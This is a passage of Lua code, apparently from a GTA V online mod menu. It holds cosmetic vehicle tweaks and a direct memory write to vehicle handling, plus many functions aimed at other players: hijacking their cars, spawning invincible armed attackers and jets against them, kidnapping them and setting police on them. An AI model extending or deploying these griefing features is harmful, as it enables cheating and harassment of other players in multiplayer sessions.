    local vvYaw = v3.getZ(vv)
    if PAD.IS_CONTROL_PRESSED(0, 63) then --63 || INPUT_VEH_MOVE_LEFT_ONLY || A
        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.
            local yawAfterPress = vvYaw - scale
            if yawAfterPress < -180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
                local toSetYaw = overFlowNeg - scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end
    end
    if PAD.IS_CONTROL_PRESSED(0, 64) then --64 ||INPUT_VEH_MOVE_RIGHT_ONLY || D
        --OLD LOGIC || if velocity > 0 then --if velocity is greater than 0, we do usual turning logic.
        if PAD.IS_CONTROL_PRESSED(0, 71) or velocity > -0.1 then
        local yawAfterPress = vvYaw - scale
        if yawAfterPress < -180 then -- check for overflow
            local overFlowNeg = math.abs(vvYaw) --positive bypass overflow
            local toSetYaw = overFlowNeg - scale
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
        else --if not overflow
            ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
        end
        elseif PAD.IS_CONTROL_PRESSED(0, 72) or velocity < -0.1 then --if not, then we do opposite turning logic.
            local yawAfterPress = vvYaw + scale
            if yawAfterPress > 180 then -- check for overflow
                local overFlowNeg = math.abs(vvYaw)*-1 --negative bypass overflow
                local toSetYaw = overFlowNeg + scale
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, toSetYaw, 2, true)
            else --if not overflow
                ENTITY.SET_ENTITY_ROTATION(veh, vvPitch, vvRoll, yawAfterPress, 2, true)
            end
        end
    end
    v3.free(vv)
end
local rgb = {cus = 100}
function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end
function rainbow_car()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        wait(rgb.cus)
       end
    end
function set_speed_rainbowcar(c)
    rgb.cus = c
end
local srgb = {cus = 100}
function rainbow_car_light()
    local color = {
        {64, 1}, --blue
        {73, 2}, --eblue  
        {51, 3}, --mgreen
        {92, 4}, --lgreen
        {89, 5}, --yellow
        {88, 6}, --gshower
        {38, 7}, --orange
        {39 , 8}, --red
        {137, 9}, --ponypink
        {135, 10}, --hotpink
        {145, 11}, --purple
        {142, 12} --blacklight
      }
     if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
      local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
      RGBNeonKit(players.user_ped())
      local rcolor = math.random(1, 12)
      VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
      VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
      VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
      VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
      VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
      VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
      wait(srgb.cus)
    end
end
function set_speed_light(c)
    srgb.cus = c
end
function hittheplayerincar()
    local localPed = players.user_ped()
    if not PED.IS_PED_IN_ANY_VEHICLE(localPed, false) then
        return
    end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(localPed, false)
    for seat = -1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
        local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seat, false)
        if ENTITY.DOES_ENTITY_EXIST(ped) and ped ~= localPed and PED.IS_PED_A_PLAYER(ped) then
            local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(ped)
            local myGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(localPed)
            PED.SET_RELATIONSHIP_BETWEEN_GROUPS(4, playerGroupHash, myGroupHash)
        end
    end
end
function ramdomupdatecar()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    wait(100)
end
function changecarsit(seatnumber)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
	local vehicle = entities.get_user_vehicle_as_handle()
	PED.SET_PED_INTO_VEHICLE(ped, vehicle, seatnumber)
end
function set_vehicle_handling_value(veh, offset, value)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    memory.write_float(handling + offset, value)
end
jclll = {"不上锁","上锁"}
function gethimcar(pid)
    control_vehicle(pid, function(vehicle)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, -2.0, 0.0, 0.1)
        ENTITY.SET_ENTITY_VELOCITY(vehicle, 0, 0, 0)
        local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true)
        TASK.TASK_ENTER_VEHICLE(ped, vehicle, 1, 1, 1.0, 24)
        if hijackLevel == 1 then
            wait(20)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        end
        for _ = 1, 20 do
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped, vehicle, 100.0, 2883621)
            wait(50)
        end
    end)
end
function randomupdatcar(pid)
    control_vehicle(pid, function(vehicle)
        VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
        for x = 0, 49 do
            local max = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, x)
            VEHICLE.SET_VEHICLE_MOD(vehicle, x, math.random(-1, max))
        end
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(-1,5))
        for x = 17, 22 do
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, x, math.random() > 0.5)
        end
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
    end)
end
DecorFlag_isAttacker = 1 << 2
local attacker = {
    stationary 	= false,
    godmode = false
}
local make_attacker = function (ped, targetId, weaponHash)
    set_decor_flag(ped, DecorFlag_isAttacker)
    PED.SET_PED_MAX_HEALTH(ped, 500)
    ENTITY.SET_ENTITY_HEALTH(ped, 500, 0)
    WEAPON.GIVE_WEAPON_TO_PED(ped, weaponHash, -1, true, true)
    WEAPON.SET_CURRENT_PED_WEAPON(ped, weaponHash, false)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, attacker.godmode)
    PED.SET_PED_COMBAT_MOVEMENT(ped, attacker.stationary and 0 or 2)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
    PED.SET_PED_COMBAT_ATTRIBUTES(ped, 0, false)
    PED.SET_RAGDOLL_BLOCKING_FLAGS(ped, 1)
    PED.SET_PED_TARGET_LOSS_RESPONSE(ped, 2)
    PED.SET_PED_CONFIG_FLAG(ped, 208, true)
    PED.SET_PED_HEARING_RANGE(ped, 150.0)
    PED.SET_PED_SEEING_RANGE(ped, 150.0)
    add_ai_blip_for_ped(ped, true, false, 250.0, -1, -1)
    util.create_tick_handler(function ()
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
        local pedPos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if not ENTITY.DOES_ENTITY_EXIST(ped) or ENTITY.IS_ENTITY_DEAD(ped, false) then
            return false
        elseif not is_player_active(targetId, false, true) or
        players.get_position(targetId):distance(pedPos) > 250.0 and not PED.IS_PED_INJURED(ped) then
            remove_decor(ped)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, false)
            WEAPON.REMOVE_ALL_PED_WEAPONS(ped, true)
            HUD.SET_PED_HAS_AI_BLIP(ped, false)
            TASK.CLEAR_PED_TASKS(ped)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, false)
            TASK.TASK_WANDER_STANDARD(ped, 10.0, 10)
            PED.SET_PED_KEEP_TASK(ped, true)
            local pHandle = memory.alloc_int()
            memory.write_int(pHandle, ped)
            ENTITY.SET_PED_AS_NO_LONGER_NEEDED(pHandle)
            return false
        elseif not PED.IS_PED_IN_COMBAT(ped, target) and not ENTITY.IS_ENTITY_DEAD(target, false) then
            TASK.CLEAR_PED_TASKS(ped)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
            TASK.TASK_COMBAT_PED(ped, target, 0, 16)
        end
    end)
end
function spawn_attacker(pid, caption, model)
    local i = 0
    local modelHash <const> = util.joaat(model)
    request_model(modelHash)
    repeat
        i = i + 1
        local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(targetPed, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local ped = entities.create_ped(0, modelHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(ped), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(ped), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
        set_entity_face_entity(ped, targetPed, false)
        local weapon <const> = weaponList.selected or table.random(Weapons)
        local weaponHash <const> = util.joaat(weapon)
        make_attacker(ped, pid, weaponHash)
        wait(150)
    until count == i
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(modelHash)
end
function spawn_attacker_own(pid)
    local i = 0
    repeat
        i = i + 1
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(target, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local clone = entities.create_ped(4, ENTITY.GET_ENTITY_MODEL(target), pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(clone), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(clone, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(clone), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(clone, true, 1)
        PED.CLONE_PED_TO_TARGET(target, clone)
        set_entity_face_entity(clone, target, false)
        local weapon <const> = weaponList.selected or table.random(Weapons)
        local weaponHash <const> = util.joaat(weapon)
        make_attacker(clone, pid, weaponHash)
        wait(150)
    until count == i
end
function spawn_attacker_click(pid)
    local i = 0
    local pedHash<const> = util.joaat("a_c_chop")
    request_model(pedHash)
    repeat
        i = i + 1
        local target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = get_random_offset_from_entity(target, 2.0, 4.0)
        pos.z = pos.z - 1.0
        local ped = entities.create_ped(28, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(ped), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(ped), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true, 1)
        set_entity_face_entity(ped, target, false)
        make_attacker(ped, pid, util.joaat("weapon_animal"))
        wait(150)
    until count == i;
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
end
function spawn_attacker_count(value)
    count = value 
end
function spawn_police_car(pid)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local offset = get_random_offset_from_entity(targetPed, 50.0, 60.0)
    local outCoords = v3.new()
    local outHeading = memory.alloc(4)
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        local vehicleHash <const> = util.joaat("police3")
        local pedHash <const> = util.joaat("s_m_y_cop_01")
        request_model(vehicleHash); request_model(pedHash)
        local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
        local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
        set_decor_flag(vehicle, DecorFlag_isAttacker)
        if not ENTITY.DOES_ENTITY_EXIST(vehicle) then return end
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, false)
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
        VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
        AUDIO.BLIP_SIREN(vehicle)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, attacker.godmode)
        local pSequence = memory.alloc_int()
        TASK.OPEN_SEQUENCE_TASK(pSequence)
        TASK.TASK_COMBAT_PED(0, targetPed, 0, 16)
        TASK.TASK_GO_TO_ENTITY(0, targetPed, 6000, 10.0, 3.0, 0.0, 0)
        TASK.SET_SEQUENCE_TO_REPEAT(memory.read_int(pSequence), true)
        TASK.CLOSE_SEQUENCE_TASK(memory.read_int(pSequence))
        for seat = -1, 0 do
            local cop = entities.create_ped(5, pedHash, outCoords, 0.0)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(cop, true, false)
            set_decor_flag(cop, DecorFlag_isAttacker)
            PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
            PED.SET_PED_RANDOM_COMPONENT_VARIATION(cop, 0)
            local weapon <const> = (seat == -1) and "weapon_pistol" or "weapon_pumpshotgun"
            WEAPON.GIVE_WEAPON_TO_PED(cop, util.joaat(weapon), -1, false, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(cop, 1, true)
            PED.SET_PED_AS_COP(cop, true)
            ENTITY.SET_ENTITY_INVINCIBLE(cop, attacker.godmode)
            TASK.TASK_PERFORM_SEQUENCE(cop, memory.read_int(pSequence))
        end
        TASK.CLEAR_SEQUENCE_TASK(pSequence)
        AUDIO.PLAY_POLICE_REPORT("SCRIPTED_SCANNER_REPORT_FRANLIN_0_KIDNAP", 0.0)
    end
end
function send_attacker_god(toggle)
    attacker.godmode = toggle 
end
function send_attacker_stay(toggle)
    attacker.stationary = toggle
end
function attacker_dele()
    for _, ped in ipairs(entities.get_all_peds_as_handles()) do
        if is_decor_flag_set(ped, DecorFlag_isAttacker) then entities.delete_by_handle(ped) end
    end
    for _,vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if is_decor_flag_set(vehicle, DecorFlag_isAttacker) then entities.delete_by_handle(vehicle) end
    end
end
tow_options = {"从前面", "从后面"}
function towcarpro(pid, index, value)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local last_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        local cur_veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
        if last_veh ~= 0 then
            if last_veh == cur_veh then
                kick_from_veh(pid)
                last_veh = cur_veh
                wait(2000)
            end
            request_control_of_entity(last_veh)
            tow_hash = -1323100960
            request_model_load(tow_hash)
            tower_hash = 0x9C9EFFD8
            request_model_load(tower_hash)
            local rots = ENTITY.GET_ENTITY_ROTATION(last_veh, 0)
            local dir = 5.0
            hdg = ENTITY.GET_ENTITY_HEADING(last_veh)
            if index == 2 then
                dir = -5.0
                hdg = hdg + 180
            end
            local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_veh, 0.0, dir, 0.0)
            local tower = entities.create_ped(28, tower_hash, coords, 30.0)
            local towtruck = entities.create_vehicle(tow_hash, coords, hdg)
            ENTITY.SET_ENTITY_HEADING(towtruck, hdg)
            PED.SET_PED_INTO_VEHICLE(tower, towtruck, -1)
            request_control_of_entity(last_veh)
            VEHICLE.ATTACH_VEHICLE_TO_TOW_TRUCK(towtruck, last_veh, false, 0, 0, 0)
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(tower, towtruck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 4, 5, 0)
        end
    end
    function dispatch_mariachi(target)
        mariachi_thr = util.create_thread(function()
            local men = {}
            local player_ped
            local pos_offsets = {-1.0, 0.0, 1.0}
            local p_hash = -927261102
            local pos
            request_model_load(p_hash)
            player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            for i=1, 3 do
                local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, pos_offsets[i], 1.0, 0.0)
                local ped = entities.create_ped(1, p_hash, spawn_pos, 0.0)
                local flag = entities.create_object(util.joaat("prop_flag_mexico"), spawn_pos, 0)
                ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(player_ped)+180)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(ped, true, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSICIAN", 0, false)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_CAN_RAGDOLL(ped, false)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                men[#men + 1] = ped
            end
        end)
    end
custom_hooker_options = {"克隆玩家", "莱斯特", "特雷西", "贝克女士", "性爱女孩"}
function sendsexgirl(pid, index, value)
    local hooker
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), -5.0, 0.0, 0.0)
    pluto_switch index do
        case 1:
            hooker = PED.CLONE_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true, false, true)
            break
        case 2:
            request_model_load(util.joaat('cs_lestercrest'))
            hooker = entities.create_ped(28, util.joaat('cs_lestercrest'), c, math.random(270))
            break
        case 3:
            request_model_load(util.joaat('cs_tracydisanto'))
            hooker = entities.create_ped(28, util.joaat('cs_tracydisanto'), c, math.random(270))
            break
        case 4:
            request_model_load(util.joaat('csb_agatha'))
            hooker = entities.create_ped(28, util.joaat('csb_agatha'), c, math.random(270))
            break
        case 5:
            request_model_load(util.joaat('a_f_y_topless_01'))
            hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
            PED.SET_PED_COMPONENT_VARIATION(hooker, 8, 1, 1, 1)
            break
    end
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), -5.0, 0.0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
end
kidnap_types = {"卡车", "直升机"}
function kidnapplayer(pid, index,value)
    local p_hash = util.joaat("s_m_y_factory_01")
        local v_hash = 0
        pluto_switch index do 
            case 1:
                v_hash = util.joaat("boxville3")
                break 
            case 2:
                v_hash = util.joaat("cargobob")
                break
        end
        local user_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        request_model_load(v_hash)
        request_model_load(p_hash)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(user_ped, 0.0, 2.0, 0.0)
        local truck = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(user_ped))
        local driver = entities.create_ped(5, p_hash, c, 0)
        PED.SET_PED_INTO_VEHICLE(driver, truck, -1)
        PED.SET_PED_FLEE_ATTRIBUTES(driver, 0, false)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        ENTITY.SET_ENTITY_INVINCIBLE(truck, true)
        request_model_load(prop_hash)
        PED.SET_PED_CAN_BE_DRAGGED_OUT(driver, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        wait(2000)
        if index == 1 then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(driver, truck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(truck), 786996, 5, 0)
        elseif index == 2 then 
            TASK.TASK_HELI_MISSION(driver, truck, 0, 0, math.random(1000), math.random(1000), 1500, 4, 200.0, 0.0, 0, 100, 1000, 0.0, 16)
        end
    end
function meowbmob(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    hash = util.joaat("a_c_cat_01")
    request_model_load(hash)
    for i=1, 30 do
        local cat = entities.create_ped(28, hash, coords, math.random(0, 270))
        local rand_x = math.random(-10, 10)*5
        local rand_y = math.random(-10, 10)*5
        local rand_z = math.random(-10, 10)*5
        ENTITY.SET_ENTITY_INVINCIBLE(cat, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(cat, 1, rand_x, rand_y, rand_z, true, false, true, true)
        AUDIO.PLAY_PAIN(cat, 7, 0)
    end
end
function tellpolicetocatch(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local all_peds = entities.get_all_peds_as_handles()
    for k, ped in pairs(all_peds) do
        if not is_ped_player(ped) then
            request_control_of_entity(ped)
            PED.SET_PED_AS_COP(ped, true)
            PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped, 453432689, 0, false, true)
            TASK.TASK_ARREST_PED(ped, player_ped)
        end
    end
end
fill_with_options = {"随机PED", "警察", "脱衣舞娘", "拉马", "莱斯特"}
function npcfillthecar(pid, index,value)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, true) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(target_ped, false)
        local success = true
        for i = 0, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(veh)) do
            local ped
            if VEHICLE.IS_VEHICLE_SEAT_FREE(veh, i) then
                local c = ENTITY.GET_ENTITY_COORDS(veh)
                    if index == 1 then
                        ped = PED.CREATE_RANDOM_PED(c.x, c.y, c.z)
                    elseif index == 2 then
                        local cops = {'s_f_y_cop_01', 's_m_m_snowcop_0', 's_m_y_hwaycop_01', 'csb_cop', 's_m_y_cop_01'}
                        local pick = cops[math.random(1, #cops)]
                        request_model_load(util.joaat(pick))
                        ped = entities.create_ped(6, util.joaat(pick), c, 0)
                        PED.SET_PED_AS_COP(ped, true)
                        WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_pistol"), 1000, false, false)
                    elseif index == 3 then
                        local strippers = {'csb_stripper_01', 'csb_stripper_02', 's_f_y_stripper_01', 's_f_y_stripper_02', 's_f_y_stripperlite'}
                        local pick = strippers[math.random(1, #strippers)]
                        request_model_load(util.joaat(pick))
                        ped = entities.create_ped(6, util.joaat(pick), c, 0)
                    elseif index == 4 then
                        request_model_load(util.joaat('ig_lamardavis'))
                        ped = entities.create_ped(6, util.joaat('ig_lamardavis'), c, 0)
                    elseif index == 5 then
                        request_model_load(util.joaat('ig_lestercrest'))
                        ped = entities.create_ped(6, util.joaat('ig_lestercrest'), c, 0)
                end
                PED.SET_PED_INTO_VEHICLE(ped, veh, i)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
                PED.SET_PED_CAN_BE_DRAGGED_OUT(ped, false)
                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, false)
            end
        end
    end
end
function jetstokill(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = util.joaat("lazer")
    request_model_load(hash)
    request_model_load(-163714847)
    for i=1, num_attackers do
        coords.x = coords.x + i*2
        coords.y = coords.y + i*2
        local jet = entities.create_vehicle(hash, coords, 0.0)
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(jet)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(jet))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(jet, true)
        end
        local pilot = entities.create_ped(28, -163714847, coords, 30.0)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 46, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
        TASK.TASK_COMBAT_PED(pilot, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(pilot, 100.0)
        PED.SET_PED_COMBAT_ABILITY(pilot, 2)
    end
end
function sendbritsh(pid)
    local hash = 0x9C9EFFD8
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    request_model_load(hash)
    request_model_load(util.joaat("prop_flag_uk"))
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, 2.0, 0.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    for i=1, 5 do
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local ped = entities.create_ped(28, hash, coords, 30.0)
        local obj = OBJECT.CREATE_OBJECT_NO_OFFSET(util.joaat("prop_flag_uk"), coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
        PED.SET_PED_AS_ENEMY(ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        WEAPON.GIVE_WEAPON_TO_PED(ped, -1834847097, 0, false, true)
        TASK.TASK_COMBAT_PED(ped, player_ped, 0, 16)
    end
end
function clownattck(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local clown_hash = 71929310
    request_model_load(clown_hash)
    local van_hash = util.joaat("speedo2")
    request_model_load(van_hash)
    local coords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, -10.0, 0.0)
    spawn_pos.x = spawn_pos['x']
    spawn_pos.y = spawn_pos['y']
    spawn_pos.z = spawn_pos['z']
    local van = entities.create_vehicle(van_hash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
    if godmodeatk then
        ENTITY.SET_ENTITY_INVINCIBLE(van, true)
    end
    for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(van) - 1 do
